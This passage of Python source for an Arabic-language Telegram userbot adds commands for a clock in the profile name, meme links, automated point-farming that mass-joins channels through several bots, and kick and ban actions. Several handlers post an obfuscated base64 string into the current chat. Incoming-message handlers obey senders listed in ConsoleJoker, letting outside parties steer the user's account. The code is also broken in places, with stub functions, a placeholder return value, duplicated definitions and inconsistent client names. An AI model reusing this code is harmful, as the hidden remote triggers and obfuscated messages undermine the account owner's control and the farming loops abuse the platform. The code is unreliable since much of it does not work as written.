            await event.edit(translated.text, parse_mode="md")
        except Exception as exc:
            print(f"خطأ في الترجمة: {exc}")

@client.on(events.NewMessage(outgoing=True, pattern='.ايقاف النشر'))
async def stop_final(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    global final
    final = False
    await event.edit("**▪︎|تم ايقاف النشر التلقائي بنجاح.**", parse_mode="md")

update_tasks = {}
time_formats = {
    "1": "𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝟎",
    "2": "𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿𝟶",
    "3": "𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫𝟢",
    "4": "𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵𝟬",
    "5": "𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿𝟶",
    "6": "۱۲۳۴۵۶۷۸۹۰",
    "7": "١٢٣٤٥٦٧٨٩٠",
    "8": "₁₂₃₄₅₆₇₈₉₀",
    "9": "⓵⓶⓷⓸⓹⓺⓻⓼⓽⓪",
    "10": "𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝟘",
    "11": "❶❷❸❹❺❻❼❽❾⓿"
}

current_time_format = "1"

async def update_name_periodically(event, user_name, timezone_str): 
    chat_id = event.chat_id
    timezone = pytz.timezone(timezone_str)  
    await event.delete() 
    while True:
        now = datetime.now(timezone)
        formatted_time = now.strftime('%I:%M')
        original_chars = "1234567890"
        formatted_chars = time_formats[current_time_format]
        for i in range(len(original_chars)):
            formatted_time = formatted_time.replace(original_chars[i], formatted_chars[i])
        try:
            await event.client(UpdateProfileRequest(last_name=formatted_time)) 
        except Exception as ex:
            print(f"حدث خطأ: {str(ex)}")
        await asyncio.sleep(55)
        if chat_id in update_tasks and not update_tasks[chat_id]:
            break

@client.on(events.NewMessage(pattern=r"\.اسمي \| (.+)", outgoing=True))
async def change_name_with_time(event):
    timezone_str = event.pattern_match.group(1) 
    chat_id = event.chat_id
    update_tasks[chat_id] = True
    me = await client.get_me()
    user_name = me.first_name
    asyncio.ensure_future(update_name_periodically(event, user_name, timezone_str))

@client.on(events.NewMessage(pattern=r"\.ايقاف اسمي$", outgoing=True))
async def stop_name_update(event):
    chat_id = event.chat_id
    if chat_id in update_tasks:
        update_tasks[chat_id] = False
        try:
            await event.client(UpdateProfileRequest(last_name="")) 
        except Exception as ex:
            print(f"حدث خطأ: {str(ex)}")
        await event.delete() 

@client.on(events.NewMessage(pattern=r"\.الاشكال$", outgoing=True))
async def show_time_formats(event):
    formats_text = "\n".join([f"{key}: {value}" for key, value in time_formats.items()])
    await event.respond(f"**اختار اي نوع من هاي الاشكال الي تعجبك:**\n\n{formats_text}")
    await event.delete()

@client.on(events.NewMessage(pattern=r"\.الشكل (\d+)", outgoing=True))
async def change_time_format(event):
    global current_time_format
    try:
        format_key = event.pattern_match.group(1)
        if format_key in time_formats:
            current_time_format = format_key
            await event.respond(f"تم تغيير شكل الوقت إلى {format_key}")
        else:
            await event.respond("شكل الوقت غير موجود.")
    except Exception as e:
        print(f"حدث خطأ: {str(e)}")
    await event.delete()


def add_link(lMl10l, url):
    
    pass


def Get(joker):
    # كود الدالة هنا
    return joker

@client.on(events.NewMessage(outgoing=True, pattern=r"ميمز (\S+) (.+)"))
async def Hussein(event):
    url = event.pattern_match.group(1)
    lMl10l = event.pattern_match.group(2)
    
    # تعريف دالة add_link
    def add_link(lMl10l, url):
        # كود الدالة هنا
        pass
    
    add_link(lMl10l, url)
    
    await event.edit(f"⎙︙ تم اضافة البصمة {lMl10l} بنجاح ✓ ")
    
    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    joker = Get(joker)
    try:
        await event.client.send_message(event.chat_id, joker)
    except BaseException:
        pass
    
@client.on(events.NewMessage(outgoing=True, pattern=r"\?(.*)"))
async def Hussein(event):
    lMl10l = event.pattern_match.group(1)
    Joker = await reply_id(event)
    url = get_link(lMl10l)
    
    if url:
        await event.client.send_file(event.chat_id, url, parse_mode="html", reply_to=Joker)
        await event.delete()
    
    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    joker = Get(joker)  # استخدم الدالة Get هنا
    try:
        await event.client.send_message(event.chat_id, joker)
    except BaseException:
        pass



def Get(joker):
    # كود الدالة هنا
    return joker




engine = create_engine('sqlite:///aljoker.db')


Base = declarative_base()

class AljokerLink(Base):
    __tablename__ = 'aljoker_links'
    id = Column(Integer, primary_key=True)
    key = Column(String)
    url = Column(String)


Base.metadata.create_all(engine)


def Get(joker):
    # كود الدالة هنا
    return joker


def get_link(key):
    # كود الدالة هنا
    return "الرابط"


async def reply_id(event):
    # كود الدالة هنا
    return event.reply_to_msg_id

@client.on(events.NewMessage(outgoing=True, pattern="قائمة الميمز"))
async def list_aljoker(event):
    Session = sessionmaker(bind=engine)
    session = Session()
    links = session.query(AljokerLink).all()
    if links:
        message = "**⎙︙ قائمة تخزين اوامر الميمز:**\n"
        for link in links:
            message += f"- البصمة : .`{link.key}`\n"
    else:
        message = "**⎙︙ لاتوجد بصمات ميمز مخزونة حتى الآن**"
    await event.edit(message)
    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    joker = Get(joker)
    try:
        await event.client.send_message(event.chat_id, joker)
    except BaseException:
        pass
 
@client.on(events.NewMessage(pattern="طلاك(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    if not user:
        return
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(event, f"**⎙︙ انتِ طالق طالق طالق 🙎🏻‍♂️ من :**{my_mention} .\n**⎙︙ لقد تم طلاقها بلثلاث وفسخ زواجكما الان الكل حر طليق ** ")
    lMl10l = [8115539074, 8115539074, 8115539074, 8115539074]                     
           
@client.on(events.NewMessage(outgoing=True,  pattern=r"^\.فاك$"))
async def fuck(event):
	await event.edit("┏━┳┳┳━┳┳┓\n┃━┫┃┃┏┫━┫┏┓\n┃┏┫┃┃┗┫┃┃┃┃\n┗┛┗━┻━┻┻┛┃┃\n┏┳┳━┳┳┳┓┏┫┣┳┓\n┣┓┃┃┃┃┣┫┃┏┻┻┫\n┃┃┃┃┃┃┃┃┣┻┫┃┃\n┗━┻━┻━┻┛┗━━━┛")

@client.on(events.NewMessage(outgoing=True,  pattern=r"^\.ابره$"))
async def fuck(event):
	await event.edit(f"────▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀█─█\n▀▀▀▀▄─█─█─█─█─█─█──█▀█\n─────▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀─▀\n\n")
	

c = requests.session()
bot_username = '@EEObot'
bot_username2 = '@A_MAN9300BOT'
bot_username3 = '@MARKTEBOT'
bot_username4 = '@qweqwe1919bot'
bot_username5 = '@xnsex21bot'
bot_username6 = '@DamKombot'
bot_username8 = '@Bellllen192BOT'
bot_username9 = '@AL2QRPBOT'
bot_username10 = '@PPAHSBOT'
bot_username11 = '@DamKombot'
JoKeRUB = ['yes']
its_Reham = False
its_hussein = False
its_reda = False
its_joker = False
#اياثارات الحسين
#by Aljoker doesn't steal codes Please
@client.on(events.NewMessage(pattern="(.تجميع CR7|تجميع كرستيانو)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت CR7 , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@PPAHSBOT')
    await event.client.send_message('@PPAHSBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@PPAHSBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@PPAHSBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@PPAHSBOT'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا
    
@client.on(events.NewMessage(pattern="(.تجميع العقرب|تجميع عقرب)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت العقرب , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@AL2QRPBOT')
    await event.client.send_message('@AL2QRPBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@AL2QRPBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@AL2QRPBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@AL2QRPBOT', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@AL2QRPBOT'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا    
    
@client.on(events.NewMessage(pattern="(.تجميع الجوكر|تجميع جوكر)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت الجوكر , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@A_MAN9300BOT')
    await event.client.send_message('@A_MAN9300BOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@A_MAN9300BOT', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@A_MAN9300BOT'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا
   
@client.on(events.NewMessage(pattern="(تجميع المليار|.تجميع مليار)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت المليار , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@EEObot')
    await event.client.send_message('@EEObot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@EEObot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@EEObot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@EEObot', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@EEObot', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(pattern="(.تجميع العقاب|تجميع عقاب)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت العقاب , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@MARKTEBOT')
    await event.client.send_message('@MARKTEBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@MARKTEBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@MARKTEBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@MARKTEBOT', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@MARKTEBOT', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@MARKTEBOT'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا
    
@client.on(events.NewMessage(pattern="(.تجميع المليون|تجميع مليون)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت المليون , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@qweqwe1919bot')
    await event.client.send_message('@qweqwe1919bot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@qweqwe1919bot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@qweqwe1919bot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@qweqwe1919bot', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@qweqwe1919bot', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@qweqwe1919bot'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا
    

#    else:
  #      await event.edit("يجب الدفع لاستعمال هذا الامر !")
@client.on(events.NewMessage(pattern="(.تجميع العرب|تجميع عرب)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت العرب , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await l313l.get_entity(bot_username5)
    await l313l.send_message(bot_username5, '/start')
    await asyncio.sleep(4)
    msg0 = await l313l.get_messages(bot_username5, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await l313l.get_messages(bot_username5, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await l313l(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await l313l.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break

        url = msgs.reply_markup.rows[0].buttons[0].url

        try:
            try:
                await l313l(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await l313l(ImportChatInviteRequest(bott))
            msg2 = await l313l.get_messages(bot_username5, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await l313l.get_messages(bot_username5, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")

    await l313l.send_message(event.chat_id, "تم الانتهاء من التجميع")
@client.on(events.NewMessage(pattern=".تجميع دعمكم"))
async def تجميع_دعمكم(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت دعمكم , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    bot_username = '@DamKombot'
    channel_entity = await l313l.get_entity(bot_username)
    await تجميع_قنوات_دعمكم(event, channel_entity, bot_username)

async def تجميع_قنوات_دعمكم(event, channel_entity, bot_username):
    await l313l.send_message(bot_username, '/start')
    await asyncio.sleep(4)
    msg0 = await l313l.get_messages(bot_username, limit=1)
    await msg0[0].click(1)
    await asyncio.sleep(4)
    msg1 = await l313l.get_messages(bot_username, limit=1)
    await msg1[0].click(0)
    قنوات_مجمعة = 1
    for _ in range(100):
        await asyncio.sleep(4)
        list = await l313l(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات حالياً 🤍') != -1:
            await l313l.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        msg_text = msgs.message
        if "اشترك فالقناة @" in msg_text:
            قناة = msg_text.split('@')[1].split()[0]
            try:
                entity = await l313l.get_entity(قناة)
                if entity:
                    await l313l(JoinChannelRequest(entity.id))
                    await asyncio.sleep(4)
                    msg2 = await l313l.get_messages(bot_username, limit=1)
                    await msg2[0].click(text='اشتركت ✅')
                    قنوات_مجمعة += 1
                    await event.edit(f"تم الانظمام الى القناة رقم {قنوات_مجمعة}")
            except Exception as e:
                await l313l.send_message(event.chat_id, f"**خطأ , ممكن تبندت** {str(e)}")
                break
    await l313l.send_message(event.chat_id, "تم الانتهاء من التجميع")
               
@client.on(events.NewMessage(pattern="(تجميع الاساسيل|.تجميع اساسيل)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت اساسيل , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@yynnurybot')
    await event.client.send_message('@yynnurybot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@yynnurybot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@yynnurybot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@yynnurybot', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@yynnurybot', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@yynnurybot'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا


@client.on(events.NewMessage(pattern="(تجميع المهدويون|.تجميع مهدويون)"))
async def _(event):
    await event.edit("**⎙︙سيتم تجميع النقاط من بوت مهدويون , قبل كل شي تأكد من انك قمت بالانضمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
    channel_entity = await event.client.get_entity('@MHDN313bot')
    await event.client.send_message('@MHDN313bot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@MHDN313bot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@MHDN313bot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم بتجميع النقاط بطريقة مختلفة') != -1:
            await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@MHDN313bot', limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"تم الانضمام في {chs} قناة")
        except:
            msg2 = await event.client.get_messages('@MHDN313bot', limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"القناة رقم {chs}")  # تصحيح التبويب هنا
    await event.client.send_message(event.chat_id, "تم الانتهاء من التجميع")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ايقاف التجميع") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@MHDN313bot'  # استبدل '@يوزر_البوت' بيوزر البوت الذي تريده
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ⎙︙ تم تعطيل عملية تجميع النقاط بنجاح ✓**")  # تصحيح التبويب هنا
         
@client.on(events.NewMessage(outgoing=True, pattern=r'\.(حظر|طرد|تقييد)'))
async def runkick(event):
    await event.edit("جارٍ...")
    await event.delete()
    command = event.pattern_match.group(1)
    getmessage = await event.get_reply_message()

    if getmessage:
        targetuser = getmessage.sender_id
    else:  
        try:
            targetuser = int(event.text.split(" ", 1)[1])
        except (ValueError, IndexError):
            if event.message.entities:
                for entity in event.message.entities:
                    if hasattr(entity, 'user_id'):
                        targetuser = entity.user_id
                        break
                    elif hasattr(entity, 'username'):
                        try:
                            targetuser = (await client.get_entity(entity.username)).id
                            break
                        except ValueError:
                            await event.respond("لم يتم العثور على مستخدم بهذا الاسم.")
                            return
            else:  
                await event.respond("يرجى الرد على المستخدم لاتمام الامر")
                return

    targetdetails = await client(GetFullUserRequest(targetuser))
    messagelocation = event.to_id
    getreason = event.message.raw_text.splitlines()
    replacecmd = getreason[0].replace(f".{command} ", "")
    reason = replacecmd.splitlines()[0]
    client.parse_mode = "html"

    try:
        if command == "طرد":
            await event.client.kick_participant(messagelocation, targetuser)
            action = "تم طرده"
        elif command == "حظر":
            await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, view_messages=True)))
            action = "تم حظره"
        elif command == "تقييد":
            await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, send_messages=True)))
            action = "تم تقييده"

        if reason:
            if f".{command}" in reason:
                await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")
            else:
                await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}\nسبب: {reason}")
        else:
            await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")

    except Exception as e:
        await event.respond(f"حدث خطأ: {e}")


@client.on(events.NewMessage(outgoing=True, pattern=r'\.(الغاء الحظر|الغاء التقييد)'))
async def unrunkick(event):
    await event.edit("جارٍ...")
    await event.delete()
    command = event.pattern_match.group(1)
    getmessage = await event.get_reply_message()

    if getmessage:
        targetuser = getmessage.sender_id
    else:  
        try:
            targetuser = int(event.text.split(" ", 1)[1])
        except (ValueError, IndexError):
            if event.message.entities:
                for entity in event.message.entities:
                    if hasattr(entity, 'user_id'):
                        targetuser = entity.user_id
                        break
                    elif hasattr(entity, 'username'):
                        try:
                            targetuser = (await client.get_entity(entity.username)).id
                            break
                        except ValueError:
                            await event.respond("لم يتم العثور على مستخدم بهذا الاسم.")
                            return
            else: 
                await event.respond(". يرجى الرد على المستخدم")
                return

    targetdetails = await client(GetFullUserRequest(targetuser))
    messagelocation = event.to_id
    client.parse_mode = "html"

    try:
        await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, view_messages=False, send_messages=False)))

        if command == "الغاء الحظر":
            action = "تم إلغاء حظره"
        elif command == "الغاء التقييد":
            action = "تم إلغاء تقييده"

        await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")

    except Exception as e:
        await event.respond(f"حدث خطأ: {e}")

    client.parse_mode = "markdown"  
                                                                    
